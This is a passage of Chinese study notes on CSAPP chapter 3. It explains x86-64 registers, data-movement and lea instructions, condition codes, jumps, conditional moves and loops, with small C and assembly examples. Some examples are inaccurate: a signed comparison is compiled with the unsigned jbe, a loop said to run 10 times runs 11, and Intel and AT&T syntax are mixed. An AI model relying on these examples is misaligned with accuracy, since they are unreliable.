代码转化为对应的汇编语言代码。</li></ul></li><li><p>如果没有出现错误，编译器将生成 <code>.s</code> 汇编文件</p></li></ul><p>例如我之前函数输错了就会在编译阶段检查出来</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250414215718-gnrltgg.png" alt="image"></p><p>3.汇编：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$gcc</span> -c。/ hello1.s -o hello1.o<br></code></pre></td></tr></table></figure><ul><li>编译阶段生成的汇编代码（<code>.s</code>​ 文件）会通过汇编器（<code>as</code>​）转换为目标文件（<code>.o</code> 文件）。</li><li>汇编器会将汇编代码转化为机器代码（机器指令），并生成可重定向文件 <code>hello.o</code>。这个文件包含了程序的二进制代码，但还没有完成链接，因此还无法执行。</li></ul><p>4.链接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$gcc</span> -g hello1.o -o hello1<br></code></pre></td></tr></table></figure><ul><li>链接器（<code>ld</code>）将所有的目标文件和标准库链接在一起，生成最终的可执行文件。</li></ul><p>‍</p><p>对于生成的hello1.o文件和hello的可执行文件，由于是二进制文件，我们不能够在文本编辑器中显示，我们可以使用反汇编器使之根据机器代码生成一种类似于汇编代码的格式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$objdump</span> -d xxx.o<br><span class="hljs-variable">$objdump</span> -d ELFfile<br></code></pre></td></tr></table></figure><p>反汇编后的样子类似于这样</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250416071908-0qjfztz.png" alt="image"></p><h3 id="机器级代码"><a href="#机器级代码" class="headerlink" title="机器级代码"></a>机器级代码</h3><p>对机器级编程来说，其中两种抽象尤为重要：</p><p>1.指令集体系结构或指令级架构来定义机器级程序的格式和行为——它定义了处理器，指令的格式，以及每条指令对状态的影响（翻译为不那么学术的说法就是当你编写 C 语言代码并编译成机器代码时，编译器会根据目标硬件的指令集生成适合的汇编或机器代码。）</p><p>2.机器级程序使用的内存地址是虚拟地址——提供的内存模型看起来是非常大的字节数组（这个得去看看虚拟内存机制）</p><p>然后在机器码里面，我们还能看到一些我们在写c的时候看不到的东西：</p><p>1.程序计数器</p><p>通常称为“pc”，在x86-64里面用寄存器rip表示，将下一条要执行的指令的地址放进这一个寄存器里面</p><p>2.寄存器</p><p>平常我们在汇编里面看到的寄存器，如下图这些</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250416013620-w1tiw7m.png" alt="image"></p><p>3.状态寄存器</p><p>用于控制跳转指令条件的寄存器</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250416063942-eissxt7.png" alt="image"></p><p>4.向量寄存器</p><p>可以存放一个或多个整数或浮点数值</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250416065139-bauhvjv.png" alt="image"></p><p>虽然c语言提供了一种模型，可以在内存中声明和分配各种数据类型对象，到那时机器码只是简单的将内存看成一个很大的，按字节寻址的数组。</p><p>c语言中的聚合数据类型，例如数组和结构，在机器代码中用一段连续的字节来表示。</p><p>即使是对标量的数据类型，汇编代码也不区分有符号到无符号整数，不区分各种类型指针，甚至不区分指针和整数。</p><p>机器码具有如下特性：</p><ul><li>指令可以从任意地址编码，无对齐规则，只是任意地址开始的编码很可能产生错误的编码或者是运行产生错误的结果。</li><li>指令长度从1-15个字节不等，运用了哈夫曼编码的思想：越常用的指令字节数越少，越不常用的指令字节数越多。</li><li>反汇编器只是根据字节序列确定汇编代码，它完全不需要知道编译出该程序的源文件即可得到。</li></ul><h2 id="数据格式"><a href="#数据格式" class="headerlink" title="数据格式"></a>数据格式</h2><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250416072441-y93w7fw.png" alt="image"></p><p>如图所示，大多数gcc生成的汇编代码指令都有一个字符后缀，表明操作数大小。</p><p>我们可以看到使用“l”同时表示了四字节大小的int类型和八字节大小的double类型，那这在使用的时候会产生冲突吗？</p><p>答案是不会的，因为double使用的是一组和整数完全不同的指令的寄存器</p><h2 id="访问信息"><a href="#访问信息" class="headerlink" title="访问信息"></a>访问信息</h2><p>现在介绍一下16个通用寄存器</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250417175323-mhvemb1.png" alt="image"></p><p>在32位机器的时候，本来只有8个通用寄存器（上图的前八个），到64位后，增加了r8 - r15，虽然这些寄存器都是8字节的，但是仍然可以表示低字节，例如：对于rax，rax表示八字节，eax则表示4字节，ax表示最低两字节的高位，al表示最低两字节的低位；可以根据上图查看寄存器的低字节表示</p><p>对于生成小于8字节结果指令，寄存器中字节生成有两条规则：</p><p>1.生成1字节和2字节数字的指令会保持剩下的字节；</p><p>2.生成4字节的指令会把高4位置零</p><h3 id="操作数指示符"><a href="#操作数指示符" class="headerlink" title="操作数指示符"></a>操作数指示符</h3><p>大多数指令会有一个到两个操作数（operand），操作数可以是立即数（immediate），寄存器（register）或者是内存地址。具有两个操作数的指令会分源操作数（source operand）和目的操作数（destination operand）。</p><p>在有两个操作数的情况下：源操作数可以是以上三种的任意，目的操作数不能为立即数，并且源操作数和目的操作数不能同时为内存地址。</p><p>对于地址引用，存在一个公式</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250417220407-rwsxbsc.png" alt="image"></p><h3 id="数据传送指令"><a href="#数据传送指令" class="headerlink" title="数据传送指令"></a>数据传送指令</h3><h4 id="mov"><a href="#mov" class="headerlink" title="mov"></a>mov</h4><p>mov的意思就是将源操作数的值复制给目的操作数，例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">;已知rax=5，rdi=8<br>mov %rdi，%rax  ;将rdi里面的内容复制到rax里面，现在rax=8，rdi=8<br></code></pre></td></tr></table></figure><p>当时根据我们上文中关于寄存器的知识，我们了解到，寄存器除了有八字节大小的，还可以使用一些小字节的寄存器，类似于eax，ax，al等。</p><p>如果我们的源操作数比较端，但是目的寄存器比较长的时候，例如</p><p>现在rax&#x3D;0x0000ffffffff4860，dl&#x3D;0x3b，现在我们需要将dl的值放入rax中</p><p>如果使用<code>mov dl,rax</code>​;这是一个非法指令，<code>mov</code> 指令要求源操作数和目标操作数大小一致</p><p>但是如果使用<code>mov dl,al</code>;这样就只能修改最低位的一个字节，现在rax里面的值就是rax&#x3D;0x0000ffffffff483b</p><p>为了应对这种情况，我们就需要对源操作数进行扩展</p><p>这时候就有两种情况：</p><p>零（zero）扩展（movz）：就是把高位全部变为0，使用零扩展，在上述场景中，rax&#x3D;0x000000000000003b</p><p>对于扩展到不同大小，分为以下命令，寄存器部分大小必须和指令后两位相匹配</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250419113820-lho605b.png" alt="image"></p><p>符号（sign）扩展（movs）：就是把高位补全为需要复制数的最高位（可能有点抽象）</p><p>例如对于-42用二进制表示为<code>11010110</code>，现在它就是8位（1字节）的负数，使用符号扩展为64位（8字节），由于这个二进制的最高位为1，所以将它的高位全补位为1，即</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">11111111 11111111 11111111 11111111 11111111 11111111 11111111 11010110<br></code></pre></td></tr></table></figure><p>转换为16进制就是0xffffffffffffffd6</p><p>同理，如果最高位为0，就将高位补充为0</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250419114221-7umd0fw.png" alt="image"></p><h4 id="压入和弹出栈数据"><a href="#压入和弹出栈数据" class="headerlink" title="压入和弹出栈数据"></a>压入和弹出栈数据</h4><p>push指令就是将数据压入栈中</p><p>类似于这两条指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 汇编">pushq %rbp<br>=<br>subq $8，%rsp<br>movq %rbp,(%rsp)<br></code></pre></td></tr></table></figure><p>先将栈顶减去8，再把数据放到栈顶</p><p>而pop指令则和push指令相反</p><p>pop指令是将栈上的数据放到寄存器中</p><p>类似于这两条指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 汇编">popq %rax<br>=<br>movq (%rsp),%rax<br>addq $8,%rsp<br></code></pre></td></tr></table></figure><p>看一下书上的图解</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250419124703-cnyz19j.png" alt="image"></p><p>注意：push 的源操作数只能是立即数或者是寄存器， pop 的目的操作数只能是寄存器</p><h2 id="算数和逻辑操作"><a href="#算数和逻辑操作" class="headerlink" title="算数和逻辑操作"></a>算数和逻辑操作</h2><p>这些操作被分为四组：加载有效地址，一元操作（一个操作数），二元操作（两个操作数），位移</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250419144310-rxk9jqx.png" alt="image"></p><h3 id="加载有效地址"><a href="#加载有效地址" class="headerlink" title="加载有效地址"></a>加载有效地址</h3><p>加载有效地址指令lea是mov的变形。它的指令形式是从内存读取数据到寄存器，但是实际上它根本就没有引用内存。</p><p>lea的作用其实就是将括号里的值直接给目的数</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 汇编">lea (%rdi+8),%rax ;就是将rdi中存储的值加上8的值直接赋值给rax<br></code></pre></td></tr></table></figure><p>现在就有一个疑问了，lea和mov的区别</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs 汇编">;假设rdi=0x100 ，在0x108地址处的值为0x25<br>;如果使用mov<br>mov [%rdi+8],%rax<br>;此时，rax的值是0x25<br>;如果使用lea<br>lea [%rdi+8],%rax<br>;此时rax的值就是0x108<br></code></pre></td></tr></table></figure><p>由此，可以看出，lea没有访问rdi+8所指向的内存</p><p>此时，我们就要开始想了，如果我mov不加[]不就和lea作用一样了吗</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 汇编">lea %rdi，%rax<br>mov %rdi，%rax<br></code></pre></td></tr></table></figure><p>这两条指令的作用是完全一样的</p><p>但是如果是下面两条指令,他们的作用还是一样的吗</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 汇编">mov %rdi+8,%rax<br>lea (%rdi+8),%rax<br></code></pre></td></tr></table></figure><p>按理来说应该是同一个作用，<strong>但是，mov不支持这样的指令格式，所以不能这么使用</strong></p><p>（应该讲清楚了吧）</p><p>lea经常用于简单的算术表达式，采用书上的例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 汇编">long scale(long x,long y,long z)&#123;<br>long t=x+4*y+12*z;<br>return t;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用lea进行算数运算</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 汇编">;x in %rdi,y in %rsi,z in %rdx<br>leaq (%rdi,%rsi,4),%rax  ;x+4*y<br>leaq (%rdx,%rdx,2),%rdx ;z+2*z=3*z<br>leaq (%rax,%rdx,4),%rax ;(x+4*y)+4*(3*z)=x+4*y+12*z<br>ret<br></code></pre></td></tr></table></figure><p>如果使用mov，指令数就会变大很多</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs 汇编">movq    %rsi, %rax        ; rax = y<br>imulq   $4, %rax          ; rax = 4*y<br>movq    %rdx, %rcx        ; rcx = z<br>imulq   $12, %rcx         ; rcx = 12*z<br>addq    %rcx, %rax        ; rax += 12*z<br>addq    %rdi, %rax        ; rax += x<br>ret<br></code></pre></td></tr></table></figure><p>可以看到使用lea只需要三条指令就可以实现这个简单的计算，但是如果使用mov，实现这个简单的运算就需要六条指令，所以，lea经常用于简单计算。</p><h3 id="一元和二元操作"><a href="#一元和二元操作" class="headerlink" title="一元和二元操作"></a>一元和二元操作</h3><p>一元操作和二元操作就是看操作数是几个</p><p>例如：</p><p>一元操作</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250422200057-smgjmvb.png" alt="image"></p><p>可以看到以上指令只有一个操作数，所以他们叫做一元操作</p><p>二元操作</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250422200219-k2z8izk.png" alt="image"></p><p>可以看到以上指令拥有两个操作数，所以他们叫做二元操作</p><h3 id="移位操作"><a href="#移位操作" class="headerlink" title="移位操作"></a>移位操作</h3><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250422215319-9mjd9gu.png" alt="image"></p><p>位移操作，先给出位移量，然后第二项给出的是要位移的数。位移量可以是一个立即数，或者放在单字节寄存器%cl中</p><p>位移分为逻辑位移和算数位移，算数位移会考虑符号位，逻辑位移则不会考虑符号位，但是符号位一般保存在高位，所以算数左移和逻辑左移的功能是一样的</p><p>算数左移（sal）：左移一次，最低位补0</p><p>逻辑左移（shl）：左移一次，最低位补0</p><p>算数右移（sar）：右移一次，最高位补符号位</p><p>逻辑右移（shr）：右移一次，最高位补0</p><p>可以看到，sal和shl的作用是一样的</p><h3 id="特殊算数操作"><a href="#特殊算数操作" class="headerlink" title="特殊算数操作"></a>特殊算数操作</h3><p>当我们将两个64位数进行相乘的时候，就可能会出现128位数，但是目前的寄存器最大为64，该怎么保存128位的数呢</p><p>x86-64指令集对128位数的操作提供有限的支持</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250422224121-kgnr4vj.png" alt="image"></p><p>在我们之前看到的乘法和除法指令都是双操作数，他们代表所使用的数和产生的结果均没有超过64位，除此之外，x86-64指令集还提供单操作数的指令，如上图</p><p>对于乘法指令，要求一个参数必须放在寄存器%rax中，而另一个作为指令的源操作数给出，然后得出的结果高64位放在%rdx，低64位放在%rax中</p><p>对于除法指令，将寄存器%rdx放入被除数的高64位，%rax放入被除数的低64位，除数作为源操作数给出，将得出的商放入%rax，余数放在%rdx中</p><h2 id="控制"><a href="#控制" class="headerlink" title="控制"></a>控制</h2><p>在之前的内容中，我们只研究了指令顺序执行的情况，但是顺序执行并不能够覆盖所有需求，我们希望程序有选择的执行一些代码，这个时候程序就不再是顺序执行，而是跳转执行</p><p>跳转分条件跳转和无条件跳转，无条件跳转执行使用jump指令改变一组机器码的执行顺序，jump指令控制程序必定跳转到它指定的位置。但是这样，程序运行与之前的顺序运行没什么区别，要实现分支结构和循环结构需要用到条件跳转了。</p><h3 id="条件码"><a href="#条件码" class="headerlink" title="条件码"></a>条件码</h3><p>除了整数寄存器，cpu还维护着一组单个位的条件码寄存器，他们描述了最近的算术或逻辑操作的属性。可以检查这些寄存器来执行条件分支指令。</p><p>常用的条件码如下：</p><p>　　CF：进位标志寄存器。最近的操作是最高位产生了进位。它可以记录无符号操作的溢出，当溢出时会被设为1。</p><p>　　ZF：零标志寄存器，最近的操作得出的结果为0。当计算结果为0时将会被设为1。</p><p>　　SF：符号标志寄存器，最近的操作得到的结果为负数。当计算结果为负数时会被设为1。</p><p>　　OF：溢出标志寄存器，最近的操作导致一个补码溢出（正溢出或负溢出）。当计算结果导致了补码溢出时，会被设为1。</p><p>lea指令不改变任何条件码，因为它是用来进行地址计算的。</p><p>inc和dec指令会设置溢出和零标志，但是不会改变进位标志。</p><p>除此之外，还有两个指令只用于修改条件码，但是不会修改操作数</p><h4 id="cmp"><a href="#cmp" class="headerlink" title="cmp"></a>cmp</h4><p>cmp指令本质上是两个值的比较，类似于sub指令，但是不保留结果，只更新条件码寄存器</p><p>cmp的操作数可以是寄存器，内存或则是立即数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 汇编">cmp S1,S2 ;S2-S1<br></code></pre></td></tr></table></figure><hr><p>这个具体的大小判断有一点点复杂，书上也只是简单的提了一下可以通过条件码寄存器判断出大小，由于之前一直没接触过条件码寄存器，对这一块很不了解，想深入看看，所以自己找资料补充一下。</p><p><a href="https://yimitumi.com/2020/04/17/%E4%BA%8C%E5%8D%81%E5%85%AB-CMP-%E6%8C%87%E4%BB%A4(%E6%AF%94%E8%BE%83%E6%8C%87%E4%BB%A4)-%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/">CMP 指令(比较指令)</a></p><p>如果S2-S1&#x3D;0，即S1&#x3D;S2，将ZF设置为1，PF（奇偶标志寄存器）设置为1</p><p>如果S2-S1!&#x3D;0,即S1!&#x3D;S2</p><p>无符号数比较</p><p>如果S1!&#x3D;S2,即ZF&#x3D;0</p><p>如果S2&lt;S1,则S2-S1会产生借位，所以CF&#x3D;1</p><p>如果S2&gt;S1,则S2-S1不会产生借位，所以CF&#x3D;0</p><p>综上，就可以根据ZF和CF两个条件码寄存器判断大小</p><p>有符号比较</p><p>如果OF&#x3D;0，说明没有产生溢出，说明此时的正负为真实的正负</p><p>如果S2&lt;S1,则S2-S1&lt;0，所以SF&#x3D;1</p><p>如果S2&gt;S1,则S2-S1&gt;0，所以SF&#x3D;0</p><p>如果OF&#x3D;1,说明产生了溢出，此时的正负为真实正负的相反结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 汇编">例如此时int S2=-64=1100 0000B，int S1=85=0101 0101B<br>本来S2-S1=-149=1 0110 1011B<br>但是我们定义的为int类型，只能保留到0110 1011B，这么一看，最高位就为0，即SF=0<br></code></pre></td></tr></table></figure><p>所以，当OF&#x3D;0时，SF&#x3D;1，说明S2&lt;S1,SF&#x3D;0，说明S2&gt;S1</p><p>当OF&#x3D;1时，SF&#x3D;1，说明S2&gt;S1,SF&#x3D;0，说明S2&lt;S1</p><hr><h4 id="test"><a href="#test" class="headerlink" title="test"></a>test</h4><p>test指令本质上时and指令，但是不保留结果，只更新条件码</p><p>cmp的操作数可以是寄存器，内存或则是立即数</p><p>test指令的典型用法是两个操作数是一样的用于判断操作数的情况，或则其中一个操作数是另一个掩码，用来指示哪些位应该被测试</p><h3 id="访问条件码"><a href="#访问条件码" class="headerlink" title="访问条件码"></a>访问条件码</h3><p>条件码通常不会直接读取，尝试用的方法有三种：</p><p>1.根据条件码的某种组合，将一个字节设置位0或者1</p><p>2.可以根据条件跳转到程序的某个其他部分</p><p>3.可以有条件地传送数据</p><p>它们一般使用的常用后缀（下表是<a href="https://xia0ji233.pro/2022/09/22/CSAPP_3/">xia0ji233</a>师傅整理出的，借鉴一下）</p><table><thead><tr><th>指令后缀</th><th>同义后缀</th><th>条件码</th><th>设置条件</th><th>英文释义</th></tr></thead><tbody><tr><td>e</td><td>z</td><td>ZF==1</td><td>相等（零）</td><td>equal（zero）</td></tr><tr><td>ne</td><td>nz</td><td>ZF==0</td><td>不相等（不为零）</td><td>not equal（not zero）</td></tr><tr><td>s</td><td>&#x2F;</td><td>SF==1</td><td>为负数</td><td>sign（with -）</td></tr><tr><td>ns</td><td>&#x2F;</td><td>SF==0</td><td>为非负数</td><td>not sign（without -）</td></tr><tr><td>g</td><td>nle</td><td>(SF^OF)==0&amp;ZF==0</td><td>有符号大于</td><td>greater（not [less or equal]）</td></tr><tr><td>ge</td><td>nl</td><td>(SF^OF)==0</td><td>有符号大于等于</td><td>greater or equal（not less）</td></tr><tr><td>l</td><td>nge</td><td>(SF^OF)==1</td><td>有符号小于</td><td>less （not [greater or equal]）</td></tr><tr><td>le</td><td>ng</td><td>(SF^OF)==1|ZF</td><td>有符号小于等于</td><td>less or equal （not greater）</td></tr><tr><td>a</td><td>nbe</td><td>CF==0&amp;ZF==0</td><td>无符号大于</td><td>above （not [below or equal]）</td></tr><tr><td>ae</td><td>nb</td><td>CF==0</td><td>无符号大于等于</td><td>above or equal （not below）</td></tr><tr><td>b</td><td>nae</td><td>CF==1</td><td>无符号小于</td><td>below （not [above or equal]）</td></tr><tr><td>be</td><td>na</td><td>CF|ZF==1</td><td>无符号小于等于</td><td>below or equal （not above）</td></tr></tbody></table><h4 id="set"><a href="#set" class="headerlink" title="set"></a>set</h4><p>我们将第一种情况的指令设置为set指令</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250425144546-ylcbypx.png" alt="image"></p><p>需要注意的是这些指令的后缀表示不同的条件而不是操作数的大小</p><p>一条set指令的目的操作数是低位单字节寄存器或则是一个字节的内存地址，指令会将这个字节设置为0或则1</p><h4 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h4><p>无条件跳转：jmp</p><p>直接跳转，即跳转目标作为指令的一部分汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 汇编">;例如<br> jmp .l1<br> pushq %rdx<br>.l1:<br> popq %rdx<br></code></pre></td></tr></table></figure><p>间接跳转，即跳转目标是从寄存器或则内存位置读出，间接跳转的写法是’*’后跟一个操作数指示符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 汇编">;例如<br>jmp *%rax ;以rax内的值作为地址跳转<br>jmp *(%rax) ;以rax指向地址中的值作为地址跳转<br></code></pre></td></tr></table></figure><p>有条件跳转：</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250425153828-u7y0rz7.png" alt="image"></p><p>条件跳转只能为直接跳转</p><h3 id="跳转指令编码"><a href="#跳转指令编码" class="headerlink" title="跳转指令编码"></a>跳转指令编码</h3><p>跳转指令表面上是要指定一个绝对地址，但是实际上编码的时候是采用了偏移量的方式去编码，它会根据跳转指令所编码的值去对自己的 %rip 寄存器加或者是减去一个偏移量，但是需要注意的是，偏移量是从下一条指令开始计算的，这也就是为什么 jmp 如果后面编码值为 0 不会产生一个死循环。</p><h3 id="用条件控制来实现条件分支"><a href="#用条件控制来实现条件分支" class="headerlink" title="用条件控制来实现条件分支"></a>用条件控制来实现条件分支</h3><p>对于一般的条件语句if</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">cmp</span><span class="hljs-params">(<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> y)</span>&#123;<br><span class="hljs-comment">//x in %rdi,y in %rsi</span><br>    <span class="hljs-keyword">if</span>(x&gt;y)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>汇编代码为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">.code<br>cmp proc<br>    mov $0,%rax<br>    cmp %rsi,%rdi<br>    jbe L1<br>    mov $1,%rax<br>L1:<br>    ret<br>cmp endp<br>end<br></code></pre></td></tr></table></figure><p>如果有 if … else … 语句的话，一般采用条件跳转和无条件跳转组合的方式去实现，比如如下的表达式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(expr)&#123;<br>    truepart<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    falsepart<br>&#125;<br></code></pre></td></tr></table></figure><p>我们进行编译之后大概率会产生如下的汇编语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">test %rdi,%rdi<br>jz L1<br>//truepart<br>jmp done<br>L1:<br>//falsepart<br>done:<br>//over<br></code></pre></td></tr></table></figure><h4 id="条件传送语句实现条件分支"><a href="#条件传送语句实现条件分支" class="headerlink" title="条件传送语句实现条件分支"></a>条件传送语句实现条件分支</h4><p>条件传送指令就和上面两类条件指令一模一样，符合条件时传送，不符合条件时不传送。</p><p>同样，如下语句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-comment">//x in %rdi,y in %rsi</span><br>    <span class="hljs-type">int</span> z;<br>    <span class="hljs-keyword">if</span>(x&gt;y)&#123;<br>        z=x-y;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        z=y-x;<br>    &#125;<br>    <span class="hljs-keyword">return</span> z<br>&#125;<br></code></pre></td></tr></table></figure><p>我们使用条件跳转语句可以很轻松地实现上述逻辑，但是我们也可以使用条件传送语句，事先算出两个部分 z 的值，先赋值假设正确的值，再用条件传送语句判断错误的条件赋值。</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250427014852-p5y0u1r.png" alt="image"></p><p>比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">movq %rdi,%rax<br>subq %rsi,%rax;let %rax=x-y<br>movq %rsi,%rbx<br>subq %rdi,%rbx;let %rbx=y-x<br>cmp %rsi,%rdi<br>cmovle %rbx,%rax;if x&lt;=y movq %rbx,%rax<br>ret<br></code></pre></td></tr></table></figure><p>可能你会疑问，这样子效率会不会遍低，因为如果运算更复杂一点，我需要把两个值都算出来，执行的指令会变多。确实，条件跳转比条件转移比起来执行的指令少，而且能泛用性广，举个例子：如果 if … else … 里面有其它语句，比如输出语句，那么我们条件传送指令显然就不能用，而条件跳转能应对这种情况。</p><p>但是条件传送实现的条件分支比条件转移实现的分支运行速度快。你可能很惊讶，为什么执行的指令多反而运行速度还快了，那是因为当今的 CPU 都是流水作业，一个指令的执行分为五个步骤，它同一时间可以执行五条指令对应的不同操作。而流水作业的前提条件是我能清楚地知道我接下来要执行的代码，如果我都不知道我接下来要执行什么代码，那么我肯定不能很好的运用流水作业了。</p><p>条件控制语句在执行完毕之前，谁也不知道它是跳转或者不跳转，也就无法知道它接下来要执行的指令，我们只能选择等待条件跳转指令执行完毕再次填充指令流水作业，速度自然就慢了。而条件转移并不改变指令的执行顺序，因此它依然能利用 CPU 的流水作业。</p><table><thead><tr><th>实现分支的方式</th><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>条件跳转</td><td>能应对所有分支情况，执行的指令较少</td><td>执行速度慢，不能很好的利用CPU的指令流水</td></tr><tr><td>条件传送</td><td>执行速度快，能很好的利用CPU的流水作业</td><td>不能应对所有的分支状况，需要把所有的情况提前计算，执行的指令较多</td></tr></tbody></table><h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><p>高级语言中，除了顺序，选择以外，还有一种结构就是循环结构了，但是事实上我们依然可以通过条件转移的方式实现循环的效果，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">movq $10,%rcx;set loop time<br>do:<br>    ;do something<br>    subq $1,%rcx<br>    test %rcx,%rcx<br>    jns do<br></code></pre></td></tr></table></figure><p>以上例程可以循环10次执行，并且可以通过修改立即数 $10 来改变循环次数。</p><p>把它转为 C 语言来写就很像我们的 do-while 循环语句：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 